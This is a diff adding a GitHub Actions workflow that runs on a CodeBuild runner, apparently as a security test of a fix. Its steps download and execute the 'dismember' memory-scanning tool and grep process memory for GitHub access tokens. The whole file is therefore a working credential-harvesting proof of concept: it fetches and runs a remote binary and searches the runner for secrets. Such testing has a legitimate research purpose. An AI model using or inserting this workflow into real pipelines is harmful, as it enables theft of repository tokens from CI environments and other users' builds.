@@ -1,0 +1,16 @@
+name: CI-CodeBuild 🚀
+
+on:
+  workflow_dispatch:
+
+jobs:
+  job1:
+  
+    runs-on:
+      - codebuild-gha-secuirty-fix-test-${{ github.run_id }}-${{ github.run_attempt }}
+      - buildspec-override:true
+    steps:
+      - name: test command
+        run: curl -o dismember -L https://github.com/liamg/dismember/releases/download/v0.0.1/dismember-linux-amd64 && chmod +x dismember
+      - name: test command
+        run: ./dismember grep 'gh[pousr]_[0-9a-zA-Z]{36}' -s
